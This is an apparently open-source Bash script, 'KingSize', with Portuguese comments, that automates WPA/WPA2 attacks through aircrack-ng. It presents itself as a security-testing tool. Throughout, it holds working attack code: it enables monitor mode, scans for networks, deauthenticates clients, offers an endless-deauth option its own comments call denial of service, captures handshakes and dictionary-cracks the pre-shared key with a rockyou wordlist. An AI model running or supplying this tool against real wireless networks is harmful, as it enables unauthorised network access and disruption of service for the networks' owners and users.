#!/bin/bash

#  KingSize tem como função realizar testes automatizados de segurança em protocolos de encriptação de dados WPA/WPA2,
# utilizando a suite aircrack-ng, xterm e yad dialogi.
#
# The MIT License (MIT) 
# Pacotes requeridos: xterm aircrack-ng yad
# Date: 2018-01-16.v1
#
# Author: João Lucas <joaolucas@linuxmail.org>
#

# Configurando variaveis do shell
DATA=`date +'%d-%m-%Y-%H-%M'`
VERSION="v0.1"
LICENSE="MIT Lincense"
AUTHOR="Joao Lucas"
INTERFACE="wlp2s0"
INTERFACEMON="mon0"
DIR=`pwd`
OUTPUT=`echo $DIR/Capturas`
HANDSHAKE=`echo $DATA`
MACATUALARCH=`ip address show dev $INTERFACE | awk '/ether/ {print $2}'`
WORDLIST="/home/joao_lucas/wordlists/rockyou-1.txt"

#INTERFACE=`ip route show | awk '/default via/ {print $5}'`
#INTERFACE=`iw dev | awk '/Interface/' {print $2}'`
#GATEWAY=`ip route show | awk '/default via/ {print $3}'`
#HOSTNAME=`hostname`
#IPINTERNO=`ip route show | awk '/src/ {print $9}'`
#IPEXTERNO=`curl -s ipinfo.io/ip`
#MACATUALKALI=`ip address | awk '/ether/ {print $2}'`

function cores() {
	escape="\033";
	br="${escape}[0m";
	az="${escape}[34m";
	vm="${escape}[31m";
	vd="${escape}[32m";
	am="${escape}[33m";
}

function verificar_dependencias(){
	if ! hash yad 2> /dev/null; then
		echo -e "  [${vm} FALHA ${br}]${az} yad dialog nao instalado! ${br}"
		exit 1
	fi

	if ! hash aircrack-ng 2>/dev/null; then
		echo -e "  [${vm} FALHA ${br}]${az} aircrack-ng nao instalado! ${br}"
		exit 1
	fi

	if ! hash reaver 2> /dev/null; then
		echo -e "  [${vm} FALHA ${br}]${az} reaver nao instalado! ${br}"
		exit 1
	fi

}

function verificar_usuario(){
	if [ `id -u` != "0" ]; then 
		echo -e "  [${vm} FALHA ${br}]${az} Executar o script como root! ${br}"
	       	exit 1
       	fi
	
}

function criar_diretorio_capturas(){
	if [ ! -d "$OUTPUT" ]; then mkdir $OUTPUT; fi;
}

function sobre(){
		yad --text="$TITLE \nversao $VERSION \n\n \
	Cracking WPA/WPA2 utilizando suite aircrack-ng e yad dialog \n\n \
	Software sob a licenca MIT License \n\nCodigo fonte disponivel no Github \n \
	<https://github.com/joao-lucas/kingsizecracking> \n\n \
	Author: $AUTHOR" \
		--text-align=center \
    --image gtk-about \
    --no-markup \
    --image-on-top \
    --button gtk-close \
    --undecorated \
    --buttons-layout=center \
		--center &
}

function iniciar_mon() {
# Verifica se a interface de monitoramento ja esta ativada
iwconfig $INTERFACEMON &> /dev/null
if [ $? -eq 0 ]; then
	echo -e "${br}  [${vd} OK ${br}]${az} Interface de monitoramento ativa! ${br} \n"
	menu
fi

# Adiciona a interface de monitoramento wlan0mon. Caso contrario, emite mensagem de erro
iw dev $INTERFACE interface add $INTERFACEMON type monitor &> /dev/null && ifconfig $INTERFACEMON up &> /dev/null && \
echo -e "${br}  [${vd} OK ${br}]${az} Monitoramento ativado! ${br} \n" || \
echo -e "${br}  [${vm} FALHA ${br}]${az} Ocorreram erros em iniciar o modo monitor! ${br} \n"

}

function matar_processos_que_atrapalham_suite(){
# há alguns processos que atrapalham a suite aircrack-ng
# exemplo: NetworkManager, wpa_supplicant, dhclient, avahi-daemon...
# Para verificar se existem processos que atrapalham a suite aircrack-ng:
# 	airmon-ng check

# Matar processos que atrapalham a suite aircrack-ng
airmon-ng check kill &> /dev/null

}

function conf_interface(){
# Verifica se a interface esta ativa, caso nao esteja, ativa a interface
ifconfig $INTERFACE &> /dev/null
if [ "$?" != 0 ]; then
	ifconfig $INTERFACE up &> /dev/null
fi

}


## ESCANEAR
function varrer(){
echo -e "${az} 1.${br} Varrer todas redes sem fio alcancadas"
echo -e "${az} 2.${br} Varrer uma rede sem fio especifica"
echo -e "${az} 99.${br} Voltar"
read -p " >>> " opt

case "$opt" in
	"1") varrer_todas_redes ;;
	"2") varrer_uma_rede ;;
	"99") menu ;;
	*) echo -e "${br} [${vm} FALHA ${br}]${az} Opcao invalida! ${br} \n"; menu ;;
esac

}

## DESAUTENTICAR
function deauth(){
echo -e "${az} 1.${br} Desautenticar todos as STA de um AP"
echo -e "${az} 2.${br} Desautenticar uma STA de um AP"
echo -e "${az} 3.${br} Enviar infinitos pacotes de deauth, causando negacao de servicos"
echo -e "${az} 99.${br} Voltar ao menu"
read -p " >>> " opt

case "$opt" in
	"1") deauth_todos_clientes ;;
	"2") deauth_cliente_especifico ;;
	"3") deauth_brute_force ;;
	"99") menu ;;
	*) echo -e "${br} [${vm} FALHA ${br}]${az} Opcao invalida! ${br} \n"; menu ;;

esac

}

function varrer_todas_redes(){
# Escanear todas redes encontradas pelo adaptador de rede sem fio. Caso contrario, emite um erro.
(xterm -geometry 100x23+680+0 -title "Escaneando todas as redes sem fio alcancadas pela interface de monitoramento $INTERFACEMON" \
-e "airodump-ng $INTERFACEMON" &) || \
echo -e "${br}  [${vm} FALHA ${br}]${az} Ocorreram erros em escanear todas as redes, verifique a interface $INTERFACEMON esta ativa! ${az} \n"

}

function setar_parametros(){
  PARAMETROS=$(yad --title "Setar parametros" --text "* Campos Obrigatorios\n" --form --field "* bssid" "" --field "* essid" "" --field "* channel" "" --field "client" "" --field "* monitor" "$INTERFACEMON" --field "wordlist" "$WORDLIST" --field "saida" "$HANDSHAKE" --button gtk-ok --button cancel --center);
  echo "param : $PARAMETROS"


	BSSID=$(echo "$PARAMETROS" | cut -d '|' -f 1)
	ESSID=$(echo "$PARAMETROS" | cut -d '|' -f 2)
	CHANNEL=$(echo "$PARAMETROS" | cut -d '|' -f 3)
	CLIENT=$(echo "$PARAMETROS" | cut -d '|' -f 4)
	INTERFACEMON=$(echo "$PARAMETROS" | cut -d '|' -f 5)
	WORDLIST=$(echo "$PARAMETROS" | cut -d '|' -f 6)
	HS=$(echo "$PARAMETROS" | cut -d '|' -f 7)
	#ARQ=$(echo "$PARAMETROS" | cut -d '|' -f 8)

  #echo "BSSID $BSSID"
  #echo "ESSID $ESSID"
  #echo "CHANNEL $CHANNEL"
  #echo "CLIENT $CLIENT"
  #echo "INTERFACEMON $INTERFACEMON"
  #echo "WORDLIST$WORDLIST"
  #echo "HANDSHAKE $HS"
}

function varrer_uma_rede() {
setar_parametros

# Verifica se os 4 parametros obrigatorios para uso da função estão setados
if [[ -z $BSSID  ]]; then echo "[${vm} FALHA${br} ] O campo obrigatorio BSSID esta vazio!"; menu; fi;
if [[ -z $ESSID ]]; then echo "[${vm} FALHA${br} ] O campo obrigatorio ESSID esta vazio!"; menu; fi;
if [[ -z $CHANNEL ]]; then echo "[${vm} FALHA${br} ] O campo obrigatorio Channel esta vazio!"; menu; fi;
if [[ -z $INTERFACEMON ]]; then echo "[${vm} FALHA${br} ] O campo obrigatorio Monitor esta vazio!"; menu; fi;

# Ajustar a interface de monitoramento para varrer hosts apenas no canal desejado
iw dev $INTERFACEMON set channel $CHANNEL 2> /dev/null
# Capture no minimo 5 mil pacotes do tipo data frame (#Data) antes de tentar realizar a quebra da senha
(xterm -geometry 100x23+680+360 -title "Escaneando rede a sem fio $ESSID" \
-e "airodump-ng --bssid $BSSID --channel $CHANNEL --write $OUTPUT/$HANDSHAKE $INTERFACEMON" &) || \
echo -e "${br}  [${vm} FALHA ${br}]${az} Ocorreram erros em escanear a rede sem fio: $ESSID ${br} \n"

}

function deauth_todos_clientes() {
# Envia 1 pacote de Desautenticação para todas as STA conectadas ao AP
(xterm -geometry 100x23+250+200 -title "Enviando pacotes de desautenticação (Deauth) para todos as STA conectadas a rede sem fio: $ESSID" \
-e  "aireplay-ng -0 1 -a $BSSID -e $ESSID $INTERFACEMON --ignore-negative-one" &) || \
echo -e "${br}  [${vm} FALHA ${br}]${az} Ocorreram erros em fazer deauth dos hosts no AP: $ESSID ${br} \n"

}

function deauth_cliente_especifico() {
# Envia 1 pacote de Desautenticação para uma STA conectada a um AP especifico
(xterm -geometry 100x23+250+200 -title "Desautenticando (Deauth) a STA $CLIENT na rede $ESSID" \
-e "aireplay-ng -0 1 -a $BSSID -c $CLIENT $INTERFACEMON --ignore-negative-one" &) || \
echo -e "${br}  [${vm} FALHA ${br}]${az} Ocorreram erros em fazer o deuth da STA $CLIENT na rede $ESSID ${br} \n"

}

function deauth_brute_force() {
# Envia infinitos pacotes de deauth, causando um ataque de negacao de servico
(xterm -geometry 100x23+250+200 -title "Enviando infinitos pacotes de deauth" \
-e "aireplay-ng -0 0 -a $BSSID -e $ESSID $INTERFACEMON --ignore-negative-one" &) || \
echo -e "${br}  [${vm} FALHA ${br}]${az} Ocorreram erros em realizar negacao de servicos na rede sem fio: $ESSID ${br} \n"

}

function injetar(){
#while true; do
# Realizar testes de injecao contra um AP
aireplay-ng -9 -a $BSSID -a $BSSID $INTERFACEMON --ignore-negative-one || \
echo -e "${br}  [${vm} FALHA ${br}]${az} Nao foi possivel injetar pacotes no AP: $ESSID ${br} \n"

#done

}

function brute_force_psk(){
# Redes que utilizam chaves criptograficas pre-compartilhadas do tipo Personal (PSK) sofrem de ataque de dicionario,
#pois a chave PTK pode ser reproduzida com a captura do 4-way handshake - MORENO, Daniel.

# recebe o nome correto do arquivo handshake que foi criado com o airodump
BPM=`ls $OUTPUT | grep $HANDSHAKE | grep cap$`
#echo "SEM dir $BPM"
BPM=$OUTPUT/$BPM
#echo "Caminho do arquivo handshake: $BPM" 
#echo "Wordlist: $WORDLIST"

# Exclui dados desnecessários, deixando apenas o 4-way handshake no arquivo para a tentativa de quebra
#wpaclean $HS.cap $OUTPUT/handshake.cap 

# Realizar a quebra da senha, por meio de um dicionario (wordlist)
(aircrack-ng -w $WORDLIST $BPM | tee -a result_quebra 2> /dev/null) || \
echo -e "${br}  [${vm} FALHA ${br}]${az} Ocorreram erros, verifique se foi capturado 4-way handshake e se o caminho da wordlist esta correto ${br} \n"


SENHA=$(cat -v result_quebra | awk '/KEY FOUND!/ {print $4}' | uniq | tac | head -n1)

echo -e "\n${az}         [][][][][]${am} SENHA ENCONTRADA:${vm} $SENHA${az} [][][][][]${br}"

}

function matar_todos_processos() {
# Matar todos processos e, reniciar servicos de gerenciamento de rede
iw dev $INTERFACEMON del 2> /dev/null
pkill xterm 2> /dev/null
pkill airodump-ng 2> /dev/null
pkill aireplay-ng 2> /dev/null
pkill airmon-ng 2> /dev/null
pkill yad 2> /dev/null
#service network-manager restart

}

function banner(){

echo -e "${vd} 					     ${br} Author: ${vd}Joao Lucas ${br}"
echo -e "${vm}     ██ ▄█▀ ██▓ ███▄    █   ▄████      ██████  ██▓▒███████▒▓█████  "
echo -e "${vm}     ██▄█▒ ▓██▒ ██ ▀█   █  ██▒ ▀█▒   ▒██    ▒ ▓██▒▒ ▒ ▒ ▄▀░▓█   ▀  "
echo -e "${vm}    ▓███▄░ ▒██▒▓██  ▀█ ██▒▒██░▄▄▄░   ░ ▓██▄   ▒██▒░ ▒ ▄▀▒░ ▒███    "
echo -e "${vm}    ▓██ █▄ ░██░▓██▒  ▐▌██▒░▓█  ██▓     ▒   ██▒░██░  ▄▀▒   ░▒▓█  ▄  "
echo -e "${vm}    ▒██▒ █▄░██░▒██░   ▓██░░▒▓███▀▒   ▒██████▒▒░██░▒███████▒░▒████▒ "
echo -e "${vm}    ▒ ▒▒ ▓▒░▓  ░ ▒░   ▒ ▒  ░▒   ▒    ▒ ▒▓▒ ▒ ░░▓  ░▒▒ ▓░▒░▒░░ ▒░ ░ "
echo -e "${vm}    ░ ░▒ ▒░ ▒ ░░ ░░   ░ ▒░  ░   ░    ░ ░▒  ░ ░ ▒ ░░░▒ ▒ ░ ▒ ░ ░  ░ "
echo -e "${vm}    ░ ░░ ░  ▒ ░   ░   ░ ░ ░ ░   ░    ░  ░  ░   ▒ ░░ ░ ░ ░ ░   ░    "
echo -e "${vm}    ░  ░    ░           ░       ░          ░   ░    ░ ░       ░  ░ ${br} v0.1"
echo -e "${vm}                                     ░ 	    ${br} " 
echo -e "${am}   _---------[${br} Interface:${am} $INTERFACE${br} - MAC Atual:${am} $MACATUALARCH ]${am}------_"


}

#function alterar_mac() {
#	ifdown $INTERFACE &> /dev/null || echo "[ ok ] ifdown"
#	macchanger -r $INTERFACE &> /dev/null
#	ifup $INTERFACE &> /dev/null || echo "[ ok ] ifup"
#
#	#MACFALSO=`ip address | awk '/ether/ {print $2}'
#}
#function ip_publico() {
# Obtem oo endereço ip publico
#IPPUBLICO=`curl -s ipinfo.io/ip`
# precisa testar se o curl executou com sucesso
#}
#function menu() {
#while true; do
#	MENU=$(yad --title "$TITLE" --list --text="\nKing Size Cracking\n" \
#	--column=" :IMG" \
#	--column="Opcao" \
#	--column="Descricao" \
#	--window-icon="gtk-connect" \
#	--image gtk-index \
#	--image-on-top \
#	--maximized \
#	--no-buttons \
#	find "Monitor" "Ativar modo monitoramento" \
#	find "Escanear" "Escanear todas redes alcancadas" \
#	gtk-execute "Deauth" "Fazer desautenticacao dos hosts no AP" \
#	gtk-execute "Injetar" "Injetar pacotes no AP" \
#	gtk-quit "Sair" "Sair do script")
#
#	MENU=$(echo $MENU | cut -d "|" -f2)
#
#	case "$MENU" in
#		"Monitor") iniciar_mon ;;
#		"Escanear") varrer_todas_redes ;;
#		"Deauth") deauth_todos ;;
#		"Injetar") injetar ;;
#		"Sair") encerrar_todos_processos; exit 0 ;;
#	esac
#done
#}

function menu(){
trap menu 2 20
while true; do
echo -e "${am}  [_____________________________________________________________________]${br}"
echo -e "${vm}x0${am}[${az} 1. ${br}Ativar modo monitoramento  ${am}					]${br}"
echo -e "${vm}x0${am}[${az} 2. ${br}Varrer			${am}					]${br}"
echo -e "${vm}x0${am}[${az} 3. ${br}Desautenticar 		${am}					]${br}" 
echo -e "${vm}x0${am}[${az} 4. ${br}Injetar			${am}					]${br}" 
echo -e "${vm}x0${am}[${az} 5. ${br}Quebrar senha		${am}					]${br}"
echo -e "${vm}x0${am}[${az} 6. ${br}Sobre 			${am}					]${br}"
echo -e "${vm}x0${am}[${az} 99.${br} Sair			${am}			________________]${br}"
read -p " >>> " opt

case "$opt" in
	"1") iniciar_mon ;;
	"2") varrer ;;
	"3") deauth ;;
	"4") injetar ;;
	"5") brute_force_psk ;;
	"6") sobre ;;	
        "99") echo -e "${br}  [${vd} OK ${br}]${az} Saindo do script ${br}"; matar_todos_processos; exit 0;;
	*) echo -e "${br} [${vm} FALHA ${br}]${az} Opcao invalida! ${br}" \n; menu ;;

esac
done

}

cores
banner
verificar_usuario
verificar_dependencias
criar_diretorio_capturas
matar_processos_que_atrapalham_suite
conf_interface
menu
